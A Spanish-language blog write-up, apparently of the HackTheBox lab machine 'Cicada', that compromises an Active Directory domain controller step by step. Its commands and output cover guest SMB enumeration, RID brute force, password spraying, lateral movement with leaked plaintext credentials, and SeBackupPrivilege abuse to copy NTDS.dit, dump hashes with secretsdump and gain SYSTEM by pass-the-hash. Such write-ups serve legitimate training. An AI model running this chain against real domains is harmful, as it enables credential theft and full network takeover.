---
title: "HTB: Cicada"
date: 2026-02-28 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, SMB, SeBackupPrivilege, NTDS, DCSync, RID-Brute, Lateral-Movement]
image:
  path: https://blog.vr0px.xyz/assets/img/posts//htb/cicada/CicadaLogo.png
  alt: HackTheBox Cicada Machine
  width: 500
  height: 280
  class: sz-contain
---

## Introducción

**Cicada** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory**.
El acceso inicial se obtiene enumerando un recurso compartido **SMB** accesible como `guest`,
donde se encuentra una nota de bienvenida del departamento de **RRHH** que expone la contraseña
por defecto de los nuevos empleados. Mediante **RID Brute Force** se enumeran los usuarios del
dominio y un **Password Spray** revela que `michael.wrightson` aún usa la contraseña por defecto.
A partir de ahí, se encadena una serie de movimientos laterales: la enumeración autenticada de
usuarios expone credenciales de `david.orelious` en texto claro, y la enumeración del recurso
`DEV` descubre un script de PowerShell con las credenciales de `emily.oscars`. Con acceso por
**WinRM**, se identifican los privilegios `SeBackupPrivilege` y `SeRestorePrivilege`, que permiten
crear un **Shadow Copy** del sistema, extraer `NTDS.dit` y `SYSTEM.hive`, y volcar todos los
hashes del dominio para finalmente acceder como `SYSTEM` mediante **Pass-The-Hash**.

---

## Reconocimiento

### Comprobación de conectividad

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.202.216
```

```
64 bytes from 10.129.202.216: icmp_seq=1 ttl=127 time=98 ms
```

### Escaneo de Puertos

Realizamos un escaneo rápido con **Nmap** para identificar todos los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -Pn -n -vvv -oN Allports 10.129.202.216
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
50765/tcp open  unknown
```

Luego ejecutamos un escaneo de versiones sobre los puertos relevantes:

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985 -sVC 10.129.202.216 -oN targeted
```

**Resultados relevantes:**

| Puerto | Estado   | Servicio                  |
|--------|----------|---------------------------|
| 53     | open     | Simple DNS Plus           |
| 88     | open     | Kerberos                  |
| 135    | open     | MS RPC                    |
| 139    | open     | NetBIOS                   |
| 389    | open     | LDAP (AD)                 |
| 445    | open     | SMB                       |
| 464    | open     | Kpasswd5                  |
| 636    | open     | LDAPS                     |
| 3268   | open     | LDAP Global Catalog       |
| 3269   | open     | LDAPS Global Catalog      |
| 5985   | open     | WinRM (HTTP)              |

### Análisis del escaneo

La combinación de **DNS (53)**, **Kerberos (88)**, **LDAP (389/636)**, **Global Catalog
(3268/3269)**, **SMB (445)** y **WinRM (5985)** confirma que estamos ante un
**Domain Controller moderno** ejecutando **Windows Server 2022**.

- **Firma SMB habilitada:** Descarta ataques de retransmisión **NTLM** clásicos.
- **SMBv1 deshabilitado:** El entorno no es vulnerable a exploits legacy como EternalBlue.
- **Sin desfase de hora significativo:** El reloj del servidor está sincronizado, lo que
  facilita los ataques **Kerberos**.
- **Vectores disponibles:** LDAP, Kerberos, SMB, WinRM — el dominio puede atacarse por
  múltiples frentes una vez se obtengan credenciales.

---

## Enumeración sin credenciales

### Confirmación del dominio vía SMB

```bash
nxc smb $IP
```

```
SMB  10.129.202.216  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64
     (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
```

Datos confirmados del entorno: host `CICADA-DC`, dominio `cicada.htb`, OS **Windows
Server 2022**, firma SMB activa y SMBv1 deshabilitado.

### LDAP anónimo

```bash
nxc ldap $IP -u '' -p ''
```

```
Error in searchRequest -> operationsError:
In order to perform this operation a successful bind must be completed
```

El servidor **rechaza las consultas LDAP anónimas**. Requiere autenticación previa para
cualquier consulta al directorio.

### Transferencia de zona DNS

```bash
dig @$IP cicada.htb
dig axfr @$IP cicada.htb
```

```
; Transfer failed.
```

La transferencia de zona está correctamente bloqueada. No hay subdominios ni hosts
internos adicionales accesibles sin credenciales.

### Enumeración de usuarios vía Kerberos

Sin credenciales, podemos verificar la existencia de usuarios mediante **Kerberos**.
El protocolo responde de forma diferente ante usuarios válidos e inválidos:

```bash
kerbrute userenum --dc $IP -d cicada.htb users.txt
```

```
[+] VALID USERNAME: guest@cicada.htb
[+] VALID USERNAME: administrator@cicada.htb
Done! Tested 11 usernames (2 valid) in 0.556 seconds
```

Con los usuarios válidos confirmados, verificamos si alguno tiene deshabilitada la
pre-autenticación de Kerberos (**AS-REP Roasting**):

```bash
GetNPUsers.py cicada.htb/guest -dc-ip $IP -no-pass
GetNPUsers.py cicada.htb/administrator -dc-ip $IP -no-pass
```

```
[-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Ambas cuentas tienen la pre-autenticación correctamente habilitada. El DC está bien
configurado en este aspecto. Continuamos por el vector **SMB**.

---

## Enumeración SMB como Guest

Comprobamos los recursos compartidos accesibles con la cuenta `guest` (sin contraseña):

```bash
nxc smb $IP -u guest -p '' --shares
```

```
SMB         10.129.202.216  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.202.216  445    CICADA-DC        [+] cicada.htb\guest:
SMB         10.129.202.216  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.202.216  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.202.216  445    CICADA-DC        -----           -----------     ------
SMB         10.129.202.216  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.202.216  445    CICADA-DC        C$                              Default share
SMB         10.129.202.216  445    CICADA-DC        DEV
SMB         10.129.202.216  445    CICADA-DC        HR              READ
SMB         10.129.202.216  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.202.216  445    CICADA-DC        NETLOGON                        Logon server share
SMB         10.129.202.216  445    CICADA-DC        SYSVOL                          Logon server share
```


Se detecta un recurso no estándar llamado **HR**. Los recursos predeterminados (`ADMIN$`,
`C$`, `IPC$`, `NETLOGON`, `SYSVOL`) no suelen tener información sensible, pero **HR**
merece una inspección inmediata:

```bash
nxc smb $IP -u guest -p '' --share HR -M spider_plus -o SHARE=HR
```

```
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB          10.129.202.216  445  CICADA-DC  [*] Enumerated shares
SMB          10.129.202.216  445  CICADA-DC  Share           Permissions     Remark
SMB          10.129.202.216  445  CICADA-DC  -----           -----------     ------
SMB          10.129.202.216  445  CICADA-DC  ADMIN$                          Remote Admin
SMB          10.129.202.216  445  CICADA-DC  C$                              Default share
SMB          10.129.202.216  445  CICADA-DC  DEV
SMB          10.129.202.216  445  CICADA-DC  HR              READ
SMB          10.129.202.216  445  CICADA-DC  IPC$            READ            Remote IPC
SMB          10.129.202.216  445  CICADA-DC  NETLOGON                        Logon server share
SMB          10.129.202.216  445  CICADA-DC  SYSVOL                          Logon server share
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.202.216.json".
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] SMB Shares:          7 (ADMIN$, C$, DEV, HR, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] SMB Readable Shares: 2 (HR, IPC$)
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] SMB Filtered Shares: 1
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] Total folders found: 0
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] Total files found:   1
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] File size average:   1.24 KB
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] File size min:       1.24 KB
SPIDER_PLUS  10.129.202.216  445  CICADA-DC  [*] File size max:       1.24 KB
```

Se encontró un archivo llamado `Notice from HR.txt`. Lo descargamos:

```bash
nxc smb $IP -u guest -p '' --share HR --get-file "Notice from HR.txt" './Notice from HR.txt'
```

**Contenido del archivo:**

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of
our security protocols, it's essential that you change your default password
to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password: [...]
```

> Tenemos una contraseña por defecto para nuevos empleados. El problema es que aún no
> sabemos a qué usuarios está asignada. El siguiente paso es enumerar las cuentas del dominio.

### Enumeración de usuarios vía RID Brute Force

Con acceso como `guest`, podemos abusar del protocolo SMB para iterar sobre los **RIDs**
del dominio y obtener todos los nombres de cuenta. Esto funciona porque SMB expone una
interfaz de resolución de SIDs que no requiere privilegios especiales:

```bash
nxc smb $IP -u guest -p '' --rid-brute
```

```
SMB  10.129.202.216  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb)
SMB  10.129.202.216  445  CICADA-DC  [+] cicada.htb\guest:
SMB  10.129.202.216  445  CICADA-DC  498:  CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  500:  CICADA\Administrator (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  501:  CICADA\Guest (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  502:  CICADA\krbtgt (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  512:  CICADA\Domain Admins (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  513:  CICADA\Domain Users (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  514:  CICADA\Domain Guests (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  515:  CICADA\Domain Computers (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  516:  CICADA\Domain Controllers (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  517:  CICADA\Cert Publishers (SidTypeAlias)
SMB  10.129.202.216  445  CICADA-DC  518:  CICADA\Schema Admins (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  519:  CICADA\Enterprise Admins (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  520:  CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  521:  CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  522:  CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  525:  CICADA\Protected Users (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  526:  CICADA\Key Admins (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  527:  CICADA\Enterprise Key Admins (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  553:  CICADA\RAS and IAS Servers (SidTypeAlias)
SMB  10.129.202.216  445  CICADA-DC  571:  CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB  10.129.202.216  445  CICADA-DC  572:  CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB  10.129.202.216  445  CICADA-DC  1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  1101: CICADA\DnsAdmins (SidTypeAlias)
SMB  10.129.202.216  445  CICADA-DC  1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  1103: CICADA\Groups (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  1104: CICADA\john.smoulder (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  1105: CICADA\sarah.dantelia (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  1106: CICADA\michael.wrightson (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  1108: CICADA\david.orelious (SidTypeUser)
SMB  10.129.202.216  445  CICADA-DC  1109: CICADA\Dev Support (SidTypeGroup)
SMB  10.129.202.216  445  CICADA-DC  1601: CICADA\emily.oscars (SidTypeUser)
```

Usuarios relevantes identificados:

```
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

---

## Password Spray

Con la lista de usuarios y la contraseña por defecto de RRHH, ejecutamos un **Password Spray**:

```bash
nxc smb $IP -u user_real.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

```
[+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

`michael.wrightson` nunca cambió su contraseña por defecto. Procedemos a enumerar el
dominio con sus credenciales.

---

## Movimiento Lateral: michael.wrightson → david.orelious

### Enumeración de shares

```bash
nxc smb $IP -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

```
SMB  10.129.202.216  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB  10.129.202.216  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB  10.129.202.216  445  CICADA-DC  [*] Enumerated shares
SMB  10.129.202.216  445  CICADA-DC  Share           Permissions     Remark
SMB  10.129.202.216  445  CICADA-DC  -----           -----------     ------
SMB  10.129.202.216  445  CICADA-DC  ADMIN$                          Remote Admin
SMB  10.129.202.216  445  CICADA-DC  C$                              Default share
SMB  10.129.202.216  445  CICADA-DC  DEV
SMB  10.129.202.216  445  CICADA-DC  HR              READ
SMB  10.129.202.216  445  CICADA-DC  IPC$            READ            Remote IPC
SMB  10.129.202.216  445  CICADA-DC  NETLOGON        READ            Logon server share
SMB  10.129.202.216  445  CICADA-DC  SYSVOL          READ            Logon server share
```
Los mismos recursos que `guest`. Sin embargo, con credenciales válidas podemos hacer
una enumeración más completa de los usuarios del dominio:

```bash
nxc smb $IP -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

```
SMB  10.129.202.216  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB  10.129.202.216  445  CICADA-DC  [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
SMB  10.129.202.216  445  CICADA-DC  -Username-           -Last PW Set-        -BadPW-  -Description-
SMB  10.129.202.216  445  CICADA-DC  Administrator        2024-08-26 20:08:03  0        Built-in account for administering the computer/domain
SMB  10.129.202.216  445  CICADA-DC  Guest                2024-08-28 17:26:56  0        Built-in account for guest access to the computer/domain
SMB  10.129.202.216  445  CICADA-DC  krbtgt               2024-03-14 11:14:10  0        Key Distribution Center Service Account
SMB  10.129.202.216  445  CICADA-DC  john.smoulder        2024-03-14 12:17:29  1
SMB  10.129.202.216  445  CICADA-DC  sarah.dantelia       2024-03-14 12:17:29  1
SMB  10.129.202.216  445  CICADA-DC  michael.wrightson    2024-03-14 12:17:29  0
SMB  10.129.202.216  445  CICADA-DC  david.orelious       2024-03-14 12:17:29  0        Just in case I forget my password is aRt$Lp#7t*VQ!3
SMB  10.129.202.216  445  CICADA-DC  emily.oscars         2024-08-22 21:20:17  0
SMB  10.129.202.216  445  CICADA-DC  [*] Enumerated 8 local users: CICADA
```

La enumeración de usuarios revela que el campo **Description** de `david.orelious` contiene
sus credenciales en texto claro, un error de configuración frecuente en entornos mal
administrados. Verificamos las credenciales:

```bash
nxc smb $IP -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
```

```
SMB  10.129.202.216  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB  10.129.202.216  445  CICADA-DC  [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
SMB  10.129.202.216  445  CICADA-DC  [*] Enumerated shares
SMB  10.129.202.216  445  CICADA-DC  Share           Permissions     Remark
SMB  10.129.202.216  445  CICADA-DC  -----           -----------     ------
SMB  10.129.202.216  445  CICADA-DC  ADMIN$                          Remote Admin
SMB  10.129.202.216  445  CICADA-DC  C$                              Default share
SMB  10.129.202.216  445  CICADA-DC  DEV             READ
SMB  10.129.202.216  445  CICADA-DC  HR              READ
SMB  10.129.202.216  445  CICADA-DC  IPC$            READ            Remote IPC
SMB  10.129.202.216  445  CICADA-DC  NETLOGON        READ            Logon server share
SMB  10.129.202.216  445  CICADA-DC  SYSVOL          READ            Logon server share
```

---

## Movimiento Lateral: david.orelious → emily.oscars

`david.orelious` tiene acceso a un recurso adicional: **DEV**. Procedemos a enumerarlo:

```bash
nxc smb $IP -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --share DEV -M spider_plus -o SHARE=DEV
```

```
{
    "DEV": {
        "Backup_script.ps1": {
            "atime_epoch": "2024-08-28 12:28:22",
            "ctime_epoch": "2024-03-14 07:31:38",
            "mtime_epoch": "2024-08-28 12:28:22",
            "size": "601 B"
        }
    }
}
```

Se detecta un script de PowerShell llamado `Backup_script.ps1`. En entornos corporativos
los scripts de backup suelen contener credenciales hardcodeadas para acceder a recursos
de red. Lo descargamos:

```bash
nxc smb $IP -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --share DEV --get-file 'Backup_script.ps1' './Backup.ps1'
```

```
SMB  10.129.202.216  445  CICADA-DC  [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB  10.129.202.216  445  CICADA-DC  [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
SMB  10.129.202.216  445  CICADA-DC  [*] Copying "Backup_script.ps1" to "./Backup.ps1"
SMB  10.129.202.216  445  CICADA-DC  [+] File "Backup_script.ps1" was downloaded to "./Backup.ps1"
```

El script contiene las credenciales de `emily.oscars` en texto claro. Verificamos el
acceso por **WinRM** contra todos los usuarios conocidos:

```bash
nxc winrm $IP -u usernames.txt -p passwords.txt
```

```
WINRM  10.129.202.216  5985  CICADA-DC  [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
WINRM  10.129.202.216  5985  CICADA-DC  [-] cicada.htb\michael.wrightson:Q!3@Lp#M6b*7t*Vt
WINRM  10.129.202.216  5985  CICADA-DC  [-] cicada.htb\david.orelious:Q!3@Lp#M6b*7t*Vt
WINRM  10.129.202.216  5985  CICADA-DC  [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (admin)
```

```
[+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

---

## Acceso Inicial: Evil-WinRM como emily.oscars

```bash
evil-winrm -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' -i cicada.htb
```

### Flag de usuario

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars> type Desktop\user.txt
<user_flag>
```

---

## Escalada de Privilegios

### Análisis de privilegios

Lo primero que hacemos al obtener acceso es revisar los privilegios del usuario actual:

```powershell
*Evil-WinRM* PS C:\Users\emily.oscars> whoami /priv
```

```
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`emily.oscars` es miembro del grupo **Backup Operators**, lo que le otorga los privilegios
`SeBackupPrivilege` y `SeRestorePrivilege`. Estos dos privilegios son extremadamente
poderosos porque permiten **leer cualquier archivo del sistema ignorando las ACLs**,
incluyendo archivos protegidos por el sistema operativo como `NTDS.dit`.

La ruta de ataque es la siguiente:

1. Crear un **Shadow Copy** del volumen C: para acceder a archivos bloqueados.
2. Copiar `NTDS.dit` (base de datos de contraseñas de AD) desde el snapshot.
3. Exportar la clave de cifrado desde el registro (`SYSTEM hive`).
4. Descifrar los hashes offline con **secretsdump**.
5. Usar el hash del `Administrator` para acceder como **SYSTEM** mediante **Pass-The-Hash**.

---

### 1. Crear Shadow Copy con Diskshadow

**Diskshadow** es una herramienta nativa de Windows que permite crear instantáneas del
sistema. Creamos un script para automatizar el proceso:

```powershell
Set-Content  C:\Windows\Temp\shadow.txt "set context persistent nowriters"
Add-Content  C:\Windows\Temp\shadow.txt "set metadata C:\Windows\Temp\shadow.cab"
Add-Content  C:\Windows\Temp\shadow.txt "add volume C: alias shadowcopy"
Add-Content  C:\Windows\Temp\shadow.txt "create"
Add-Content  C:\Windows\Temp\shadow.txt "expose %shadowcopy% Z:"
```

```powershell
diskshadow /s C:\Windows\Temp\shadow.txt
```

Este script crea un **Volume Shadow Copy** del disco `C:` y lo expone como la unidad `Z:`.
La importancia de usar un snapshot es que `NTDS.dit` está permanentemente bloqueado por
el proceso `lsass` mientras el sistema está en funcionamiento. Al acceder a través del
snapshot, obtenemos una copia del archivo sin el bloqueo del sistema.

---

### 2. Copiar NTDS.dit usando SeBackupPrivilege

Con el snapshot montado en `Z:`, copiamos `NTDS.dit` usando **robocopy** en modo backup.
El flag `/b` activa el modo backup, que permite copiar archivos ignorando las restricciones
de permisos gracias a `SeBackupPrivilege`:

```powershell
robocopy Z:\Windows\NTDS C:\Windows\Temp ntds.dit /b
```

---

### 3. Exportar el SYSTEM hive

`NTDS.dit` almacena los hashes de las cuentas de AD cifrados. La clave para descifrarlos
se encuentra en el **SYSTEM hive** del registro. Sin ella, los hashes son ilegibles:

```powershell
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
```

---

### 4. Descargar los archivos

Descargamos ambos archivos a nuestra máquina desde la sesión de **Evil-WinRM**:

```powershell
download "C:\Windows\Temp\ntds.dit"
download "C:\Windows\Temp\SYSTEM.hive"
```

---

### 5. Extraer los hashes con secretsdump

Con `ntds.dit` y `SYSTEM.hive` en nuestra máquina, usamos **secretsdump** para descifrar
y volcar todos los hashes del dominio de forma local (sin necesidad de conectarse al DC):

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM.hive LOCAL
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:...:::
[...]
```

**NT Hash del Administrador:** `2b87e7c93a3e8a0ea4a581937016f341`

---

## Acceso Final como Administrador

Usamos el hash obtenido para autenticarnos como `Administrator` mediante **Pass-The-Hash**:

```bash
psexec.py cicada.htb/administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
```

```
NT AUTHORITY\SYSTEM
```

### Flag de root

```powershell
C:\Users\Administrator\Desktop> type root.txt
<root_flag>
```

**¡Máquina comprometida con éxito!**
